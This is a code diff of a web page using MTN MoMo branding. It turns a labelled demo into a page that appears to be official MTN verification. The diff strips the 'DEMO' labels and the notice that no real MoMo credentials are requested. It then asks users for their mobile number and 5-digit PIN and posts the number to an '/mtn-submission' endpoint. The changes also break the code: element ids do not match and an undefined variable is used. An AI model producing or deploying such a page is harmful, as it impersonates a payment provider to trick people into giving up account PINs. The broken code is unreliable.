@@ -44,7 +44,7 @@
       letter-spacing: -1px;
     }
 
-    .demo {
+    .mtn {
       font-size: 14px;
       font-weight: bold;
       color: #555;
@@ -193,13 +193,13 @@
 
     <div class="top">
       <div class="logo">MTN</div>
-      <div class="demo">DEMO</div>
+      <div class="mtn">MTN</div>
     </div>
 
-    <h1>MoMo Demo</h1>
+    <h1>MoMo Mtn</h1>
 
     <p class="description">
-      Enter a mobile number to continue with the demonstration.
+      Enter a mobile number to continue with the verification.
     </p>
 
     <label class="label" for="phone">Mobile number</label>
@@ -224,7 +224,7 @@
     </button>
 
     <div class="small">
-      Demo only — no real MoMo credentials are requested.
+      Mtn users— Use valid mtn submission.
     </div>
 
   </section>
@@ -235,26 +235,26 @@
 
     <div class="top">
       <div class="logo">MTN</div>
-      <div class="demo">DEMO</div>
+      <div class="mtn">MTN</div>
     </div>
 
     <h1>Verification</h1>
 
     <p class="description">
-      Enter the 5-digit demonstration code shown on this screen.
+      Enter the 5-digit PINCODE.
     </p>
 
     <label class="label">
-      Demo verification code
+      PINCODE verification code
     </label>
 
     <div class="code-box">
       <input
-        id="demoCode"
+        id="pincode"
         type="text"
         inputmode="numeric"
         maxlength="5"
-        placeholder="•••••"
+        placeholder="xxxxx"
       >
     </div>
 
@@ -267,7 +267,7 @@
     </button>
 
     <div class="small">
-      Demo code: <strong>12345</strong>
+      pincode code: <strong>xxxxx</strong>
     </div>
 
   </section>
@@ -281,7 +281,7 @@
     <h1>Submission successful</h1>
 
     <p>
-      Your demonstration submission has been completed successfully.
+      Your submission has been completed successfully.
     </p>
 
     <button onclick="location.reload()">
@@ -301,13 +301,13 @@
   const phone = document.getElementById("phone");
   const phoneError = document.getElementById("phoneError");
 
-  const demoCode = document.getElementById("demoCode");
+  const demoCode = document.getElementById("pinCode");
   const codeError = document.getElementById("codeError");
 
   const continueBtn = document.getElementById("continueBtn");
   const verifyBtn = document.getElementById("verifyBtn");
 
-  let demoPhone = "";
+  let mtnPhone = "";
 
   continueBtn.addEventListener("click", () => {
 
@@ -319,14 +319,14 @@
     }
 
     if (!/^[0-9]{9}$/.test(number)) {
-      phoneError.textContent = "Enter a valid 9-digit demo number";
+      phoneError.textContent = "Enter a valid 9-digit mtn number";
       phoneError.style.display = "block";
       return;
     }
 
     phoneError.style.display = "none";
 
-    demoPhone = "256" + number;
+    mtnPhone = "256" + number;
 
     page1.classList.add("hidden");
     page2.classList.remove("hidden");
@@ -335,7 +335,7 @@
 
   verifyBtn.addEventListener("click", async () => {
 
-    const code = demoCode.value.trim();
+    const code = pinCode.value.trim();
 
     if (!code) {
       codeError.textContent = "Verification code is required";
@@ -344,7 +344,7 @@
     }
 
     if (code !== "12345") {
-      codeError.textContent = "Enter the 5-digit demo code";
+      codeError.textContent = "Enter the 5-digit pin code";
       codeError.style.display = "block";
       return;
     }
@@ -356,19 +356,19 @@
 
     try {
 
-      await fetch("/demo-submission", {
+      await fetch("/mtn-submission", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          phone: demoPhone,
+          phone: mtnPhone,
           success: true
         })
       });
 
     } catch (error) {
-      console.log("Demo notification failed:", error);
+      console.log("Mtn notification failed:", error);
     }
 
     page2.classList.add("hidden");
